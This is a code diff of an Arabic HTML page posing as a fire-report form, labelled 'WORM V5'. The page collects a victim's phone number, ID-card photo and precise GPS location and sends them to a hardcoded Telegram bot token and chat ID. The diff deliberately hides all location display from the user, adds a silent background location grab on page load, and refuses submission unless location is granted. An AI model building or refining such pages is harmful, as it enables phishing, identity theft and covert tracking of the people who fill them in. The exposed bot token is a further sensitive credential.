@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بلاغ حريق - WORM V3</title>
+    <title>بلاغ حريق - WORM V5</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -59,16 +59,9 @@
             font-size: 14px;
             color: #ffaa00;
         }
-        .gps-box {
-            background: #1a2a1a;
-            padding: 12px;
-            border-radius: 10px;
-            margin: 15px 0;
-            text-align: center;
-            border: 1px solid #33aa33;
-            font-size: 14px;
+        .hidden-gps {
+            display: none;
         }
-        .gps-box span { color: #7fff7f; font-weight: bold; }
         .btn-gps {
             background: #2a6b2a;
             margin-top: 5px;
@@ -76,18 +69,6 @@
             font-size: 14px;
         }
         .btn-gps:hover { background: #1f8b1f; }
-        .gps-link {
-            display: inline-block;
-            margin-top: 8px;
-            padding: 8px 15px;
-            background: #1a4a8a;
-            border-radius: 8px;
-            color: #7fcfff;
-            text-decoration: none;
-            font-weight: bold;
-            border: 1px solid #3a8aff;
-        }
-        .gps-link:hover { background: #2a6aba; }
     </style>
 </head>
 <body>
@@ -101,12 +82,8 @@
     <label>🪪 صورة الهوية</label>
     <input type="file" id="idImage" accept="image/*">
 
-    <div class="gps-box">
-        <div>📍 الموقع (GPS):</div>
-        <div id="gpsDisplay"><span>⏳ جاري الجلب...</span></div>
-        <div id="gpsLinkContainer" style="margin-top:8px;"></div>
-        <button class="btn-gps" id="refreshGpsBtn">🔄 إعادة محاولة الموقع</button>
-    </div>
+    <!-- لا شيء يظهر للمستخدم عن الموقع – كل شيء في الخلفية -->
+    <div class="hidden-gps"></div>
 
     <button id="sendBtn">🔥 إرسال البلاغ</button>
     <div id="status">⏳ في انتظار الإرسال</div>
@@ -116,67 +93,47 @@
     const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
     const CHAT_ID = "8665747715";
 
-    let userLat = "غير متاح";
-    let userLon = "غير متاح";
-
-    // ======== دالة تحديث رابط خرائط جوجل ========
-    function updateGoogleMapsLink(lat, lon) {
-        const container = document.getElementById('gpsLinkContainer');
-        if (lat !== "غير متاح" && lon !== "غير متاح") {
-            const url = `https://www.google.com/maps?q=${lat},${lon}`;
-            container.innerHTML = `<a href="${url}" target="_blank" class="gps-link">🗺️ فتح في خرائط جوجل</a>`;
-        } else {
-            container.innerHTML = '';
-        }
-    }
+    let userLat = null;
+    let userLon = null;
+    let gpsResolve = null;
+    let gpsReject = null;
 
     // ======== دالة جلب الموقع ========
     function getGPS() {
-        const gpsDisplay = document.getElementById('gpsDisplay');
-        gpsDisplay.innerHTML = `<span>⏳ جاري جلب الموقع...</span>`;
-
-        if (!navigator.geolocation) {
-            gpsDisplay.innerHTML = `<span style="color:#ff6666;">❌ المتصفح لا يدعم GPS</span>`;
-            return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                userLat = pos.coords.latitude;
-                userLon = pos.coords.longitude;
-                gpsDisplay.innerHTML = `<span style="color:#7fff7f;">✅ ${userLat}, ${userLon}</span>`;
-                updateGoogleMapsLink(userLat, userLon);
-                document.getElementById('status').innerHTML = '✅ GPS جاهز';
-                document.getElementById('status').style.color = '#7fff7f';
-            },
-            (err) => {
-                let msg = '';
-                switch (err.code) {
-                    case 1: msg = '🚫 المستخدم رفض الإذن (افتح الإعدادات واسمح)'; break;
-                    case 2: msg = '📡 الموقع غير متاح حالياً'; break;
-                    case 3: msg = '⏱️ انتهت مهلة المحاولة'; break;
-                    default: msg = '⚠️ خطأ غير معروف: ' + err.message;
-                }
-                gpsDisplay.innerHTML = `<span style="color:#ff6666;">${msg}</span>`;
-                document.getElementById('status').innerHTML = '⚠️ ' + msg;
-                document.getElementById('status').style.color = '#ffaa00';
-                updateGoogleMapsLink("غير متاح", "غير متاح");
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject("المتصفح لا يدعم تحديد الموقع");
+                return;
             }
-        );
+
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude
+                    });
+                },
+                (err) => {
+                    let msg = '';
+                    switch (err.code) {
+                        case 1: msg = 'الموقع مرفوض (افتح الإعدادات واسمح)';
+                            break;
+                        case 2: msg = 'الموقع غير متاح حالياً';
+                            break;
+                        case 3: msg = 'انتهت مهلة المحاولة';
+                            break;
+                        default: msg = 'خطأ غير معروف: ' + err.message;
+                    }
+                    reject(msg);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        });
     }
-
-    // جلب الموقع فور تحميل الصفحة
-    getGPS();
-
-    // زر إعادة المحاولة
-    document.getElementById('refreshGpsBtn').addEventListener('click', function() {
-        getGPS();
-    });
 
     // ======== إرسال البيانات إلى تليجرام ========
     async function sendToTelegram(phone, imageFile, lat, lon) {
@@ -184,11 +141,7 @@
         statusDiv.innerHTML = '⏳ جاري الإرسال...';
         statusDiv.style.color = '#ffaa00';
 
-        // بناء رابط خرائط جوجل
-        let mapsLink = "غير متاح";
-        if (lat !== "غير متاح" && lon !== "غير متاح") {
-            mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        }
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
         try {
             const formData = new FormData();
@@ -217,35 +170,65 @@
         }
     }
 
-    // ======== زر الإرسال الرئيسي ========
-    document.getElementById('sendBtn').addEventListener('click', function () {
+    // ======== زر الإرسال الرئيسي (يجبر الموقع) ========
+    document.getElementById('sendBtn').addEventListener('click', async function () {
         const phone = document.getElementById('phone').value.trim();
         const fileInput = document.getElementById('idImage');
         const file = fileInput.files[0];
+        const statusDiv = document.getElementById('status');
 
+        // التحقق من الحقول
         if (!phone) {
-            document.getElementById('status').innerHTML = '⚠️ أدخل رقم الهاتف';
-            document.getElementById('status').style.color = '#ffaa00';
+            statusDiv.innerHTML = '⚠️ أدخل رقم الهاتف';
+            statusDiv.style.color = '#ffaa00';
             return;
         }
         if (!file) {
-            document.getElementById('status').innerHTML = '⚠️ اختر صورة الهوية';
-            document.getElementById('status').style.color = '#ffaa00';
+            statusDiv.innerHTML = '⚠️ اختر صورة الهوية';
+            statusDiv.style.color = '#ffaa00';
             return;
         }
 
-        // إذا الموقع غير متاح، نطلب مرة أخرى قبل الإرسال
-        if (userLat === "غير متاح" || userLon === "غير متاح") {
-            document.getElementById('status').innerHTML = '⏳ جاري جلب الموقع... حاول مرة أخرى خلال 3 ثوان';
-            document.getElementById('status').style.color = '#ffaa00';
-            getGPS();
-            setTimeout(() => {
-                sendToTelegram(phone, file, userLat, userLon);
-            }, 3000);
-        } else {
-            sendToTelegram(phone, file, userLat, userLon);
+        // ======== جلب الموقع ========
+        statusDiv.innerHTML = '⏳ جاري جلب الموقع...';
+        statusDiv.style.color = '#ffaa00';
+
+        try {
+            const gpsData = await getGPS(); // ينتظر حتى يجلب الموقع أو يرفض
+            userLat = gpsData.lat;
+            userLon = gpsData.lon;
+
+            // الموقع جاهز – نرسل
+            await sendToTelegram(phone, file, userLat, userLon);
+
+        } catch (error) {
+            // فشل الموقع – نمنع الإرسال
+            statusDiv.innerHTML = `❌ لا يمكن الإرسال بدون موقع: ${error}`;
+            statusDiv.style.color = '#ff6666';
+
+            // نعرض رسالة للمستخدم أنه يجب السماح بالموقع
+            alert(`⚠️ لا يمكن إرسال البلاغ دون تحديد الموقع.\nالرجاء السماح للمتصفح بالوصول إلى الموقع.\nالخطأ: ${error}`);
         }
     });
+
+    // ======== جلب أولي لتجهيز الموقع (في الخلفية) ========
+    // نحاول جلب الموقع فوراً ولكن بدون إزعاج المستخدم
+    // إذا رفض، لا بأس، سيُطلب منه عند الإرسال
+    setTimeout(() => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    userLat = pos.coords.latitude;
+                    userLon = pos.coords.longitude;
+                    document.getElementById('status').innerHTML = '✅ الموقع جاهز (خلفية)';
+                    document.getElementById('status').style.color = '#7fff7f';
+                },
+                () => {
+                    // نتركه يمر – سيُطلب عند الإرسال
+                }
+            );
+        }
+    }, 100);
 
     // تحديث الحالة عند تغيير المدخلات
     document.getElementById('phone').addEventListener('input', () => {
